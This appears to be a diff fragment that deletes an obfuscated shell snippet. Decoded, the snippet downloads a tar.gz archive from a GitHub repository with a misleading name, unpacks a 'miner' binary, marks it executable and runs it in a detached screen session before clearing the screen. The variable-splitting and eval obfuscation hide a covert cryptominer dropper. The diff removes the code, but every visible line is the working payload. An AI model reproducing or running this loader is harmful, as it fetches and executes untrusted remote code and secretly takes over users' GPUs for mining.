@@ -1,3 +1,0 @@
-z="
-";Nz='get ';iz='tar ';qz='ner ';Qz='raw.';kz=' z.t';Vz='t.co';Lz='ATH ';Iz='a &&';gz='r.gz';mz='z &&';Pz='s://';Gz='64-n';Mz='&& w';Dz='ATH=';cz='cord';Xz='ymas';hz=' && ';ABz='&& c';nz=' chm';BBz='lear';Uz='nten';tz='n -d';Oz='http';rz='&& s';az='tikT';Tz='erco';xz='/min';oz='od +';Cz='RY_P';Hz='vidi';jz='-xvf';sz='cree';Ez='/usr';Kz='ort ';pz='x mi';dz='/mas';wz='c ".';Jz=' exp';Bz='IBRA';vz='sh -';lz='ar.g';Rz='gith';Az='LD_L';yz='er" ';fz='z.ta';bz='oDis';ez='ter/';Yz='49/M';Wz='m/ar';uz='m ba';Sz='ubus';Zz='ikro';Fz='/lib';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Az$Bz$Cz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz"
